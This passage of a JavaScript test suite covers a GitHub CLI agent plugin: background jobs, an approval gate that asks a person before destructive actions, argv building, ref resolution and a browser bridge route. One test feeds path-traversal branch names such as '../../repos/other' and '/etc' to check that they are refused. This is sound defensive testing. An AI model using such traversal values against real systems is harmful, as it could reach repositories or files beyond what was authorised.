  // and it is exactly the kind of mistake a hand-maintained list invites.
  /** @type {string[]} */
  const overlaps = []
  /** @type {string[]} */
  const unknown = []
  for (const domain of ALL_DOMAINS) {
    const declared = domain.readOnlyActions ?? []
    for (const name of declared) {
      if (domain.actions[name] === undefined) unknown.push(`${domain.tool}.${name}`)
      else if (domain.actions[name].destructive === true) overlaps.push(`${domain.tool}.${name}`)
    }
  }
  assert.deepEqual(unknown, [], 'a read-only entry names no such action')
  assert.deepEqual(overlaps, [], 'an action is classified both destructive and read-only')

  // And the classification has to be a real one, not an empty list everywhere.
  const readOnly = ALL_DOMAINS.flatMap((d) => (d.readOnlyActions ?? []).map((a) => `${d.tool}.${a}`))
  assert.ok(readOnly.length >= 20, `expected a substantial read-only set, saw ${readOnly.length}`)
})

/**
 * A minimal JobHandle stub.
 *
 * The real registry always hands one to `run(job)`; these tests call `run`
 * directly, so they must supply the same shape or the streaming calls would
 * throw for a reason that has nothing to do with what is under test.
 * @returns {{ id: string, append: Function, updateProgress: Function }} the stub
 */
function jobHandle() {
  return { id: 'github-x', append: () => {}, updateProgress: () => {} }
}

test('background: the flag is honoured only for a long action, and never silently downgraded', async () => {
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner()
  // No job registry: the call must say so rather than quietly run in the
  // foreground, which is the failure mode a declared-but-unwired flag produces.
  registerDomainTools(ctx, testConfig(), runner)

  const noRegistry = await call(tools.get('github_actions'), {
    action: 'runWatch', repo: 'a/b', runId: '1', run_in_background: true,
  })
  assert.equal(noRegistry.ok, false)
  assert.match(noRegistry.stderr, /background jobs unavailable/)
  assert.equal(calls.gh.length, 0, 'nothing may run when the flag cannot be honoured')

  // The flag only applies to a long action, so it cannot turn a cheap read into
  // an unkillable job.
  const notLong = await call(tools.get('github_actions'), {
    action: 'runView', repo: 'a/b', runId: '1', run_in_background: true,
  })
  assert.equal(notLong.ok, false)
  assert.match(notLong.stderr, /not long-running/)
  assert.equal(calls.gh.length, 0)
})

test('background: a composed registry gets the job, and the handle is programmatic', async () => {
  const { ctx, tools } = makeContext()
  const { runner } = makeRunner()
  /** @type {any[]} */
  const started = []
  const jobs = {
    start(spec) {
      started.push(spec)
      return 'github-1'
    },
  }
  registerDomainTools(ctx, testConfig(), runner, { deps: { jobs } })

  const result = await call(tools.get('github_actions'), {
    action: 'runWatch', repo: 'a/b', runId: '1', run_in_background: true,
  })

  assert.equal(result.ok, true)
  // The handle is a typed field a program reads, not text it has to parse —
  // PTC mode must be able to recover the id without the rendered line.
  assert.deepEqual(result.data, { kind: 'background', jobId: 'github-1', jobKind: 'github' })
  assert.match(result.stdout, /started background job github-1/)
  assert.equal(started.length, 1)
  assert.equal(started[0].label.includes('gh run watch'), true, `label was ${started[0].label}`)

  // The job owns cancellation: the spec exposes cancel and done, and cancel
  // must abort the underlying process signal.
  const hooks = started[0].run(jobHandle())
  assert.equal(typeof hooks.cancel, 'function')
  assert.equal(typeof hooks.done.then, 'function')
})

test('background: the job runs with no timeout and settles on its own signal', async () => {
  const { ctx, tools } = makeContext()
  /** @type {any[]} */
  const options = []
  const { runner } = makeRunner({
    onGh: (argv, opts) => {
      options.push(opts)
      return { ok: true, exitCode: 0, signal: '', timedOut: false, durationMs: 5, command: 'gh', stdout: '', stderr: '', truncated: false, spillPath: '' }
    },
  })
  /** @type {any} */
  let spec
  registerDomainTools(ctx, testConfig(), runner, { deps: { jobs: { start: (s) => { spec = s; return 'github-2' } } } })

  await call(tools.get('github_actions'), { action: 'runLog', repo: 'a/b', runId: '1', run_in_background: true })

  // Admitting the job must not start any work: the registry calls run() only
  // after its own preflight, so until then there is nothing to leak.
  assert.equal(options.length, 0, 'nothing may start before run() is called')

  const hooks = spec.run(jobHandle())
  assert.equal(options.length, 1, 'run() is what starts the work')
  assert.equal(options[0].noTimeout, true, 'a background job must not inherit the foreground deadline')
  assert.equal(options[0].exec.signal.aborted, false)

  const outcome = await hooks.done
  assert.equal(outcome.status, 'completed')
  assert.match(outcome.detail, /exit 0/)
})

test('background: cancelling the job aborts the process signal', async () => {
  const { ctx, tools } = makeContext()
  /** @type {any[]} */
  const options = []
  const { runner } = makeRunner({
    onGh: (argv, opts) => {
      options.push(opts)
      return new Promise(() => {}) // never settles: the job is cancelled instead
    },
  })
  /** @type {any} */
  let spec
  registerDomainTools(ctx, testConfig(), runner, { deps: { jobs: { start: (s) => { spec = s; return 'github-3' } } } })
  await call(tools.get('github_actions'), { action: 'runWatch', repo: 'a/b', runId: '1', run_in_background: true })
  const hooks = spec.run(jobHandle())
  assert.equal(options[0].exec.signal.aborted, false)
  hooks.cancel('user asked')
  assert.equal(options[0].exec.signal.aborted, true, 'cancel must reach the process signal')
})

test('background: the job is owned by the session id, never by the agent object', async () => {
  // `JobSpec.owner` is a SessionId that the registry resolves with
  // `agents.get(session)`. Passing the Agent object produced
  // `session "[object Object]" has no live agent` on a real call, so this pins
  // the shape: the id is extracted, and an unknown shape degrades to unowned
  // work rather than to a broken owner.
  const { ownerSessionOf } = await import('../lib/registry.js')
  assert.equal(typeof ownerSessionOf, 'function')

  assert.equal(ownerSessionOf({ agent: { id: 'sess-1' } }), 'sess-1')
  // The reference writes `owner: exec.agent`, so a bare string is accepted too.
  assert.equal(ownerSessionOf({ agent: 'sess-2' }), 'sess-2')
  // Unowned work is legitimate: `resolveOwner` returns early for it.
  assert.equal(ownerSessionOf(undefined), undefined)
  assert.equal(ownerSessionOf({}), undefined)
  assert.equal(ownerSessionOf({ agent: {} }), undefined)
  assert.equal(ownerSessionOf({ agent: { id: '' } }), undefined)
  assert.equal(ownerSessionOf({ agent: { id: 42 } }), undefined)
  assert.equal(ownerSessionOf({ agent: null }), undefined)
})

test('background: the admitted job carries that session id as its owner', async () => {
  const { ctx, tools } = makeContext()
  const { runner } = makeRunner()
  /** @type {any} */
  let spec
  registerDomainTools(ctx, testConfig(), runner, { deps: { jobs: { start: (s) => { spec = s; return 'github-9' } } } })
  await tools.get('github_actions').execute(
    { action: 'runWatch', repo: 'a/b', runId: '1', run_in_background: true },
    { signal: undefined, agent: { id: 'sess-42' } },
  )
  assert.equal(spec.owner, 'sess-42')
})

test('background: a rejected preflight must leave no process running', async () => {
  // The registry only calls `run()` after it validates the owner and the task
  // controller, and a rejected start must leave no execution resource. Spawning
  // eagerly would leak a live process into a job that was never admitted —
  // invisible to job_list and unreachable by job_kill.
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner()
  registerDomainTools(ctx, testConfig(), runner, {
    deps: {
      jobs: {
        start() {
          throw new Error('owner has no attached job controller')
        },
      },
    },
  })
  await assert.rejects(
    () => call(tools.get('github_actions'), { action: 'runWatch', repo: 'a/b', runId: '1', run_in_background: true }),
    /no attached job controller/,
  )
  assert.equal(calls.gh.length, 0, 'a rejected admission must not have spawned anything')
})

test('background: the job streams its output into the ring, or job_output reads nothing', async () => {
  const { ctx, tools } = makeContext()
  /** @type {any[]} */
  const options = []
  const { runner } = makeRunner({
    onGh: (argv, opts) => {
      options.push(opts)
      // Emit through the runner's hook, which is what a real stream does.
      opts.onOutput('stdout', 'Run still in progress\n')
      opts.onOutput('stderr', 'a warning\n')
      return { ok: true, exitCode: 0, signal: '', timedOut: false, durationMs: 7, command: 'gh', stdout: '', stderr: '', truncated: false, spillPath: '' }
    },
  })
  /** @type {any} */
  let spec
  registerDomainTools(ctx, testConfig(), runner, { deps: { jobs: { start: (s) => { spec = s; return 'github-4' } } } })
  await call(tools.get('github_actions'), { action: 'runWatch', repo: 'a/b', runId: '1', run_in_background: true })

  /** @type {{ text: string }[]} */
  const appended = []
  /** @type {string[]} */
  const progress = []
  const hooks = spec.run({ append: (text) => appended.push(text), updateProgress: (line) => progress.push(line) })
  await hooks.done

  assert.deepEqual(appended.map((a) => a.text ?? a), ['Run still in progress\n', 'a warning\n'])
  assert.equal(progress.length, 1, 'the job reports its label as progress')
  assert.match(progress[0], /gh run watch/)
  assert.equal(typeof options[0].onOutput, 'function')
})

test('background: a throwing output sink must not break the run', async () => {
  // The registry owns the ring; a full or broken ring is the reader's problem,
  // never a reason to fail a process the user is waiting on.
  const { createRunner } = await import('../lib/runner.js')
  const { testConfig: cfg } = await import('./helpers.mjs')
  const runner = createRunner(cfg({ ghPath: process.execPath }), undefined, async () => '')
  const result = await runner.run(
    ['-e', 'process.stdout.write("hello")'],
    {
      noTimeout: true,
      onOutput: () => { throw new Error('ring exploded') },
    },
  )
  assert.equal(result.ok, true)
  assert.equal(result.stdout, 'hello')
})

test('approval: a destructive action asks the user, and asking is the default', async () => {
  const { ctx, emit } = makeContext()
  const { runner } = makeRunner()
  const { installDestructiveApproval } = await import('../lib/registry.js')
  const cfg = testConfig()
  assert.equal(cfg.approvalForDestructive, true)

  registerDomainTools(ctx, cfg, runner)
  installDestructiveApproval(ctx, cfg)

  // The gate defers on a read, so a normal call is untouched.
  const read = await emit({ name: 'github_pr', arguments: { action: 'view', repo: 'a/b', number: 1 } })
  assert.deepEqual(read, { kind: 'allow' })

  // A destructive action reaches a person, and the reason names the target.
  const ask = await emit({ name: 'github_repo', arguments: { action: 'delete', repo: 'a/b' } })
  assert.equal(ask.kind, 'ask')
  assert.match(ask.reason, /github_repo:delete/)
  assert.match(ask.reason, /a\/b/)

  // An action name that merely LOOKS destructive is not asked about.
  const unknown = await emit({ name: 'github_repo', arguments: { action: 'delete-everything' } })
  assert.deepEqual(unknown, { kind: 'allow' })
})

test('approval: the gate never turns a denial into a prompt', async () => {
  const { ctx, emit } = makeContext()
  const { runner } = makeRunner()
  const { installDestructiveApproval } = await import('../lib/registry.js')
  registerDomainTools(ctx, testConfig(), runner)
  installDestructiveApproval(ctx, testConfig())

  // A seam that already denied the call must stay denied: asking about work
  // that cannot happen would be a prompt with no effect.
  const denied = await emit(
    { name: 'github_repo', arguments: { action: 'delete', repo: 'a/b' } },
    async () => ({ kind: 'deny', reason: 'blocked upstream' }),
  )
  assert.deepEqual(denied, { kind: 'deny', reason: 'blocked upstream' })
})

test('approval: the gate is absent when switched off, and harmless without the seam', async () => {
  const { installDestructiveApproval } = await import('../lib/registry.js')

  const off = makeContext()
  assert.equal(installDestructiveApproval(off.ctx, testConfig({ approvalForDestructive: false })), undefined)
  assert.equal(off.listeners.get('tools/pre-execute'), undefined, 'no listener may be installed')

  const on = makeContext()
  assert.equal(typeof installDestructiveApproval(on.ctx, testConfig()), 'function')
  assert.equal((on.listeners.get('tools/pre-execute') ?? []).length, 1)

  // A bare context with no `on` (and no approval service) must not throw.
  assert.equal(installDestructiveApproval({ logger: { warn: () => {} } }, testConfig()), undefined)
  assert.equal(installDestructiveApproval(undefined, testConfig()), undefined)
})

test('tokenizeQuery: an empty or unterminated query is refused with a reason', async () => {
  const { tokenizeQuery } = await import('../lib/domains/search.js')
  assert.match(tokenizeQuery('').error, /is empty/)
  assert.match(tokenizeQuery('   ').error, /is empty/)
  assert.match(tokenizeQuery('"unterminated').error, /unterminated quote/)
  // The refusal must carry no terms, or a caller could act on a partial parse.
  assert.equal(tokenizeQuery('"unterminated').terms, undefined)
})

test('version: the minimum gh version check parses a real --version line', async () => {
  // `gh --version` prints "gh version 2.89.0 (2026-03-26)". Extracting the FIRST
  // token yields "gh", and Number.parseInt("gh") is NaN, so every comparison
  // answered "not older" — including for gh 0.5.0. The whole switch was dead.
  const { versionToken, isOlderThan } = await import('../lib/version.js')

  assert.equal(versionToken('gh version 2.89.0 (2026-03-26)'), '2.89.0')
  assert.equal(versionToken('gh version 1.0.0 (2020-01-01)'), '1.0.0')
  assert.equal(versionToken('2.89.0'), '2.89.0', 'a bare version also parses')
  assert.equal(versionToken('gh 2.89.0'), '2.89.0', 'so does a line with no version word')
  assert.equal(versionToken(''), '')

  // The comparisons the dead code was supposed to make.
  assert.equal(isOlderThan('gh version 2.89.0 (2026-03-26)', '2.0.0'), false, '2.89.0 is not older than 2.0.0')
  assert.equal(isOlderThan('gh version 1.0.0 (2020-01-01)', '2.0.0'), true, '1.0.0 IS older than 2.0.0')
  assert.equal(isOlderThan('gh version 0.5.0', '2.0.0'), true)
  assert.equal(isOlderThan('gh version 2.0.0', '2.0.0'), false, 'equal is not older')
  assert.equal(isOlderThan('gh version 2.10.0', '2.9.0'), false, 'numeric segment compare, not string')
  assert.equal(isOlderThan('gh version 2.9.0', '2.10.0'), true)
  // An unreadable version is a parsing problem, not a reason to warn about gh.
  assert.equal(isOlderThan('', '2.0.0'), false)
  assert.equal(isOlderThan('gh', '2.0.0'), false)
})

test('argv: branch selection is wired everywhere gh supports it', async () => {
  // The plugin's own description promised `branches` would "inspect one when
  // `branch` is given" while the argv builder ignored it entirely, and `clone`
  // passed a GIT flag to a gh command that does not accept it. Both are pinned
  // here against the flags gh actually documents.
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner()
  registerDomainTools(ctx, testConfig({ defaultRepo: 'o/r' }), runner)

  // repo view: gh's own --branch, which accepts --json alongside it.
  await call(tools.get('github_repo'), { action: 'view', branch: 'release/2.x' })
  assert.deepEqual(calls.gh[0].slice(0, 3), ['repo', 'view', 'o/r'])
  assert.ok(calls.gh[0].includes('--branch'))
  assert.equal(calls.gh[0][calls.gh[0].indexOf('--branch') + 1], 'release/2.x')

  // repo branches: a branch goes into the PATH, RAW — percent-encoding the
  // slash makes the API answer 404, verified against the live API.
  calls.gh.length = 0
  await call(tools.get('github_repo'), { action: 'branches', branch: 'feat/x-1' })
  assert.deepEqual(calls.gh[0], ['api', 'repos/o/r/branches/feat/x-1'])
  assert.ok(!calls.gh[0][1].includes('%2F'), 'the slash must NOT be encoded')

  // repo branches without a branch lists, and `limit` becomes per_page — the
  // endpoint defaults to 30 a page, so otherwise `limit` would do nothing.
  calls.gh.length = 0
  await call(tools.get('github_repo'), { action: 'branches', limit: 100 })
  assert.deepEqual(calls.gh[0], ['api', 'repos/o/r/branches?per_page=100'])
  calls.gh.length = 0
  await call(tools.get('github_repo'), { action: 'branches', limit: 9999 })
  assert.match(calls.gh[0][1], /per_page=100$/, 'per_page is capped at the API maximum')
  // repo clone: --branch is a GIT flag, so it must follow the `--` separator.
  calls.gh.length = 0
  await call(tools.get('github_repo'), { action: 'clone', repo: 'o/r2', branch: 'dev' })
  assert.deepEqual(calls.gh[0], ['repo', 'clone', 'o/r2', '--', '--branch', 'dev'])
  calls.gh.length = 0
  await call(tools.get('github_repo'), { action: 'clone', repo: 'o/r2' })
  assert.deepEqual(calls.gh[0], ['repo', 'clone', 'o/r2'], 'no separator without a branch')

  // pr list: base and head filters.
  calls.gh.length = 0
  await call(tools.get('github_pr'), { action: 'list', base: 'main', head: 'feat/x' })
  const listArgv = calls.gh[0]
  assert.equal(listArgv[listArgv.indexOf('--base') + 1], 'main')
  assert.equal(listArgv[listArgv.indexOf('--head') + 1], 'feat/x')

  // pr checkout: the local branch name.
  calls.gh.length = 0
  await call(tools.get('github_pr'), { action: 'checkout', number: 7, branch: 'local-name' })
  assert.deepEqual(calls.gh[0], ['pr', 'checkout', '7', '--branch', 'local-name', '--repo', 'o/r'])

  // issue develop: the base branch. `develop` writes a remote branch, so it
  // carries `confirm: true` like every other write (R3).
  calls.gh.length = 0
  await call(tools.get('github_issue'), { action: 'develop', number: 3, base: 'develop', confirm: true })
  assert.deepEqual(calls.gh[0], ['issue', 'develop', '3', '--base', 'develop', '--repo', 'o/r'])
})

test('argv: a branch name used as a path segment cannot escape it', async () => {
  // The branch is interpolated raw so a slash works, which means a traversal
  // shape WOULD add path segments. safeBranchName is what stops that, and it is
  // wired in as the action's check so the call is refused before gh runs.
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner()
  registerDomainTools(ctx, testConfig({ defaultRepo: 'o/r' }), runner)

  for (const hostile of ['../../repos/other', '/etc', '..', 'a/../..', '.hidden']) {
    const result = await call(tools.get('github_repo'), { action: 'branches', branch: hostile })
    assert.equal(result.ok, false, `branch ${JSON.stringify(hostile)} must be refused`)
    assert.match(result.stderr, /branch name is invalid/)
  }
  assert.equal(calls.gh.length, 0, 'no request may be issued for a rejected branch')

  // A normal name with a slash still passes, which is the whole point.
  const ok = await call(tools.get('github_repo'), { action: 'branches', branch: 'feat/normal' })
  assert.equal(ok.ok, true)
  assert.equal(calls.gh.length, 1)
})

test('argv: no action mixes `gh api` with a --json field selection', async () => {
  // `gh api` has no `--json` flag. `github_repo branches` declared one, so the
  // registry appended `--json name,commit` and EVERY call failed with
  // "unknown flag: --json" — the action had never worked. This walks the real
  // argv builders, so a new action cannot reintroduce the combination.
  const offenders = []
  for (const domain of ALL_DOMAINS) {
    for (const [actionName, action] of Object.entries(domain.actions)) {
      if (typeof action.json !== 'string') continue
      let argv
      try {
        argv = action.argv({ action: actionName, number: 1, name: 'x', repo: 'o/r' }, testConfig({ defaultRepo: 'o/r' }), 'o/r')
      } catch {
        continue // an action needing parameters this probe cannot supply
      }
      if (!Array.isArray(argv)) continue
      if (argv[0] === 'api') offenders.push(`${domain.tool}.${actionName}`)
    }
  }
  assert.deepEqual(offenders, [], 'these actions would send --json to gh api')

  // The same walk confirms the ones that legitimately use --json still do.
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner()
  registerDomainTools(ctx, testConfig({ defaultRepo: 'o/r' }), runner)
  await call(tools.get('github_repo'), { action: 'view' })
  assert.ok(calls.gh[0].includes('--json'), 'gh repo view does accept --json')
  calls.gh.length = 0
  await call(tools.get('github_repo'), { action: 'branches', limit: 5 })
  assert.ok(!calls.gh[0].includes('--json'), 'gh api must not be given --json')
  assert.deepEqual(calls.gh[0], ['api', 'repos/o/r/branches?per_page=5'])
})

test('argv: a search query is split into the terms gh requires', async () => {
  // gh quotes EVERY positional argument before joining them, so a whole query in
  // one argument becomes a single quoted term and is rejected with
  // `Invalid search query "( repo:\"cli/cli is:open\" )"`. Measured against
  // gh 2.89.0: one argument fails, whitespace-separated arguments succeed.
  const { tokenizeQuery } = await import('../lib/domains/search.js')

  // The R3 change: a malformed query is REFUSED with a reason instead of being
  // handed to gh, which answers a syntax error naming no cause. The success shape
  // is `{ terms }`; the failure shape is `{ error }`.
  assert.deepEqual(tokenizeQuery('repo:cli/cli is:open'), { terms: ['repo:cli/cli', 'is:open'] })
  assert.deepEqual(tokenizeQuery('  spaced   out  '), { terms: ['spaced', 'out'] })
  assert.deepEqual(tokenizeQuery('one'), { terms: ['one'] })
  // An empty or whitespace-only query is a refusal, not an empty term list: gh
  // would answer "expected 1 argument" with nothing the caller can act on.
  assert.match(tokenizeQuery('').error, /is empty/)
  assert.match(tokenizeQuery('   ').error, /is empty/)
  // A quoted run stays one term WITH its quotes: splitting it would unbalance
  // them, and gh needs the quotes to treat it as a phrase.
  assert.deepEqual(tokenizeQuery('repo:cli/cli "exact phrase"'), { terms: ['repo:cli/cli', '"exact phrase"'] })
  assert.deepEqual(tokenizeQuery('"a b" c'), { terms: ['"a b"', 'c'] })
  // An UNTERMINATED quote is the case that used to pass through silently, as one
  // term carrying a dangling `"`. It is now named.
  const unterminated = tokenizeQuery('"unterminated phrase')
  assert.match(unterminated.error, /unterminated quote/)
  assert.equal(unterminated.terms, undefined, 'a refusal carries no terms')

  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner()
  registerDomainTools(ctx, testConfig({ defaultRepo: 'o/r' }), runner)
  for (const action of ['repos', 'issues', 'prs', 'code', 'commits']) {
    calls.gh.length = 0
    await call(tools.get('github_search'), { action, query: 'repo:cli/cli is:open', limit: 2 })
    const argv = calls.gh[0]
    assert.deepEqual(argv.slice(0, 4), ['search', action, 'repo:cli/cli', 'is:open'],
      `${action}: the query must arrive as separate terms`)
    assert.ok(!argv.includes('repo:cli/cli is:open'), `${action}: the query must not stay in one argument`)
  }
})

test('refs: @current and @default resolve to real branch names', async () => {
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner({
    onGit: (argv) => {
      const stdout = argv[0] === 'rev-parse' ? 'feat/x-1\n' : ''
      return { ok: true, exitCode: 0, signal: '', timedOut: false, durationMs: 1, command: 'git', stdout, stderr: '', truncated: false, spillPath: '' }
    },
    onGh: (argv) => {
      const stdout = argv[1] === 'view' && argv.includes('--jq') ? 'trunk\n' : ''
      return { ok: true, exitCode: 0, signal: '', timedOut: false, durationMs: 1, command: 'gh', stdout, stderr: '', truncated: false, spillPath: '' }
    },
  })
  registerDomainTools(ctx, testConfig({ defaultRepo: 'o/r' }), runner)

  // @current on a read: the workspace branch is looked up with git.
  const current = await call(tools.get('github_repo'), { action: 'view', branch: '@current' })
  assert.equal(current.ok, true)
  const gitCall = calls.git.find((argv) => argv[0] === 'rev-parse')
  assert.deepEqual(gitCall, ['rev-parse', '--abbrev-ref', 'HEAD'])
  assert.equal(calls.gh[0][calls.gh[0].indexOf('--branch') + 1], 'feat/x-1')
  assert.match(current.stdout, /\[ref\] branch: feat\/x-1 \(current branch\)/)

  // @default on a read: the repository's own default branch, read through gh.
  // The lookup itself is a gh call, so the list call is the LAST one.
  calls.gh.length = 0
  const fallback = await call(tools.get('github_pr'), { action: 'list', base: '@default' })
  assert.equal(fallback.ok, true)
  const listArgv = calls.gh.at(-1)
  assert.equal(listArgv[listArgv.indexOf('--base') + 1], 'trunk')
  assert.match(fallback.stdout, /\[ref\] base: trunk \(repository default\)/)

  // An explicit branch is passed through untouched, with no note and no lookup.
  calls.gh.length = 0
  calls.git.length = 0
  const explicit = await call(tools.get('github_pr'), { action: 'list', base: 'release/2.x' })
  assert.equal(calls.gh.at(-1)[calls.gh.at(-1).indexOf('--base') + 1], 'release/2.x')
  assert.ok(!explicit.stdout.includes('[ref]'), 'an explicit value must not produce a note')
  assert.equal(calls.git.length, 0, 'no git lookup when the caller was explicit')
})

test('refs: github_actions list defaults its branch filter, and says so', async () => {
  // The one defaulted filter. It is stated in the output because a filter that
  // quietly narrows a list is how a caller concludes "nothing there" when there
  // is something there.
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner({
    onGit: () => ({ ok: true, exitCode: 0, signal: '', timedOut: false, durationMs: 1, command: 'git', stdout: 'fix/ci\n', stderr: '', truncated: false, spillPath: '' }),
  })
  registerDomainTools(ctx, testConfig({ defaultRepo: 'o/r' }), runner)

  const defaulted = await call(tools.get('github_actions'), { action: 'list' })
  const argv = calls.gh[0]
  assert.equal(argv[argv.indexOf('--branch') + 1], 'fix/ci')
  assert.match(defaulted.stdout, /\[ref\] branch: fix\/ci \(current branch\)/)

  // "*" is the escape hatch: it removes the filter so gh sees every branch.
  calls.gh.length = 0
  await call(tools.get('github_actions'), { action: 'list', branch: '*' })
  assert.ok(!calls.gh[0].includes('--branch'), '"*" must drop the filter entirely')

  // github_pr list deliberately does NOT default: `gh pr list` shows every open
  // pull request, and a hidden base filter would remove what the list is for.
  calls.gh.length = 0
  await call(tools.get('github_pr'), { action: 'list' })
  assert.ok(!calls.gh[0].includes('--base'), 'pr list must stay unfiltered by default')
})

test('refs: an unresolvable sentinel is left visible rather than silently dropped', async () => {
  // A detached HEAD and a repository we cannot read are both "nothing known".
  // Dropping the argument would send gh an UNFILTERED query while the caller
  // asked for a specific branch — the wrong ref, silently.
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner({
    onGit: () => ({ ok: true, exitCode: 0, signal: '', timedOut: false, durationMs: 1, command: 'git', stdout: 'HEAD\n', stderr: '', truncated: false, spillPath: '' }),
    onGh: () => ({ ok: false, exitCode: 1, signal: '', timedOut: false, durationMs: 1, command: 'gh', stdout: '', stderr: 'not found', truncated: false, spillPath: '' }),
  })
  registerDomainTools(ctx, testConfig({ defaultRepo: 'o/r' }), runner)

  // A detached HEAD prints the literal "HEAD", which is not a branch name.
  const detached = await call(tools.get('github_repo'), { action: 'view', branch: '@current' })
  assert.equal(calls.gh[0][calls.gh[0].indexOf('--branch') + 1], '@current', 'the sentinel stays as written')
  assert.match(detached.stdout, /@current requested, but the workspace has no checked-out branch/)

  // A default branch that cannot be read behaves the same way. The failed
  // lookup is a gh call too, so the list call is the LAST one.
  calls.gh.length = 0
  await call(tools.get('github_pr'), { action: 'list', base: '@default' })
  assert.equal(calls.gh.at(-1)[calls.gh.at(-1).indexOf('--base') + 1], '@default')
})

test('refs: the ref table never names a credential parameter', async () => {
  // `ref` is a git ref on github_actions dispatch and a CREDENTIAL name on
  // github_auth. A name-based rule would rewrite the credential. This asserts
  // the wiring is a table and that the auth domain is not in it.
  const { REF_PARAMS } = await import('../lib/registry.js')
  assert.equal(typeof REF_PARAMS, 'object')
  for (const key of Object.keys(REF_PARAMS)) {
    assert.ok(!key.startsWith('github_auth:'), `github_auth must not appear: ${key}`)
  }
  assert.deepEqual(REF_PARAMS['github_actions:dispatch'], ['ref'])
  assert.deepEqual(REF_PARAMS['github_pr:list'], ['base', 'head'])
  // Every listed pair must name a real action and a real parameter, so a rename
  // cannot leave a silently dead entry behind.
  for (const [key, params] of Object.entries(REF_PARAMS)) {
    const [tool, actionName] = key.split(':')
    const domain = ALL_DOMAINS.find((d) => d.tool === tool)
    assert.ok(domain !== undefined, `unknown tool in the ref table: ${tool}`)
    assert.ok(domain.actions[actionName] !== undefined, `unknown action in the ref table: ${key}`)
    for (const param of params) {
      assert.ok(Object.keys(domain.params).includes(param), `${key} lists "${param}", which the domain does not declare`)
    }
  }

  // And an auth call must reach gh with the credential name untouched.
  const { ctx, tools } = makeContext()
  const { runner, calls } = makeRunner()
  registerDomainTools(ctx, testConfig(), runner)
  await call(tools.get('github_auth'), { action: 'token', ref: '@current' })
  assert.ok(!calls.git.some((argv) => argv[0] === 'rev-parse'), 'an auth ref must not trigger a git lookup')
})

test('registry: the plugin never writes to the frozen argument object', async () => {
  // The registry materializes `arguments` as detached lossless JSON and freezes
  // that value before policy begins. Resolving a ref sentinel by writing back
  // into it therefore threw `Cannot assign to read only property 'branch'` on a
  // live call — after every offline check had passed, because the test helper
  // was handing over a mutable object. It freezes too now, and this asserts the
  // contract by name: resolution must go through a working copy.
  const { ctx, tools } = makeContext()
  const { runner } = makeRunner({
    onGit: () => ({ ok: true, exitCode: 0, signal: '', timedOut: false, durationMs: 1, command: 'git', stdout: 'feat/x\n', stderr: '', truncated: false, spillPath: '' }),
  })
  registerDomainTools(ctx, testConfig({ defaultRepo: 'o/r' }), runner)

  const frozen = Object.freeze({ action: 'view', branch: '@current', repo: 'o/r' })
  await assert.doesNotReject(
    () => tools.get('github_repo').execute(frozen, { signal: undefined }),
    'a frozen argument object must survive ref resolution',
  )
  assert.equal(frozen.branch, '@current', "the caller's arguments must not be rewritten in place")

  // The "*" escape deletes an argument, which is the other write a frozen object
  // forbids.
  const frozenActions = Object.freeze({ action: 'list', branch: '*', repo: 'o/r' })
  await assert.doesNotReject(() => tools.get('github_actions').execute(frozenActions, { signal: undefined }))
  assert.equal(frozenActions.branch, '*')
})

test('schema: the result schema DECLARES the contract through per-property required', async () => {
  // This plugin originally recorded "the value DSL cannot express required" —
  // an over-generalization from one rejected form. `{ required: ['ok'] }` IS
  // rejected, but a per-PROPERTY `required: true` is accepted and compiles into
  // the object-level list. Reading the shipped `@deepseek-ai/dsh-tool-fs` showed
  // that; its output schema marks every field `required: true`.
  //
  // What this test does NOT claim: that the value is validated at run time.
  // Measured: defineTool's own wrapper hands back a value that omits a required
  // field without complaining. The reference says the REGISTRY completes
  // validation after execute, which a direct `execute` call bypasses, so run-time
  // enforcement is unmeasured here and is not asserted either way. The contract
  // is additionally pinned on real return values by the test below.
  const { defineTool } = await import('@deepseek-ai/dsh-tools')
  const tool = defineTool({
    name: 'probe_contract',
    description: 'probe',
    parameters: { action: { type: 'string', required: true, description: 'x' } },
    output: { schema: RESULT_VALUE_SCHEMA, render: () => [] },
    async execute() { return { ok: true, exitCode: 0 } },
  })

  assert.deepEqual(tool.output.schema.required, [...RESULT_KEYS],
    'every result field must be declared required')
  assert.equal(tool.output.schema.additionalProperties, false, 'the result object must be closed')
  assert.ok(!tool.output.schema.required.includes('data'),
    'data stays optional: a gate rejection has no parsed payload')

  // The declaration must survive what the registry receives, i.e. it is still
  // inside the enforced subset after compiling.
  assert.deepEqual(findSchemaViolations(tool.output.schema), [])
})

test('client bridge: the branch route serves only REGISTERED workspaces', async () => {
  // The route is reachable from the browser, so the membership check is the
  // security property, not a nicety: without it the endpoint becomes an
  // arbitrary-directory probe that reports whether any path on the machine is a
  // git repository.
  const { installClientBridge, BRANCH_ROUTE, BRANCHES_ROUTE, DIAGNOSTICS_ROUTE, SWITCH_ROUTE } = await import('../lib/client-bridge.js')

  /** @type {any[]} */
  const routes = []
  const webServer = { register: (route) => { routes.push(route); return () => {} } }
  const { ctx } = makeContext({
    services: {
      webServer,
      workspaceRegistry: { resolveByPath: async (path) => (path === 'D:\\work\\registered' ? { path: 'D:\\work\\registered' } : undefined) },
    },
  })
  const { runner, calls } = makeRunner({
    onGit: () => ({ ok: true, exitCode: 0, signal: '', timedOut: false, durationMs: 1, command: 'git', stdout: 'feat/pill\n', stderr: '', truncated: false, spillPath: '' }),
  })
  installClientBridge(ctx, { runner, logger: ctx.logger, webServer: ctx.get('webServer'), registry: ctx.get('workspaceRegistry') })

  // Four now: the read route, the diagnostics route, and the two that let the pill switch\n  // (the branch list and the switch itself). Asserted by name below rather than by count\n  // alone, so adding a route without thinking about it fails here.\n  assert.equal(routes.length, 4, 'read, diagnostics, branch list, and switch')
  assert.deepEqual(routes.map((r) => r.path).sort(), [BRANCH_ROUTE, BRANCHES_ROUTE, DIAGNOSTICS_ROUTE, SWITCH_ROUTE].sort())
  assert.equal(routes[0].kind, 'exact', 'an exact route, so nothing else is captured')

  /** Run the handler and capture the response. */
  const respond = async (url, method = 'GET') => {
    let status = 0
    /** @type {any} */
    let body
    const res = {
      setHeader: () => {},
      set statusCode(value) { status = value },
      get statusCode() { return status },
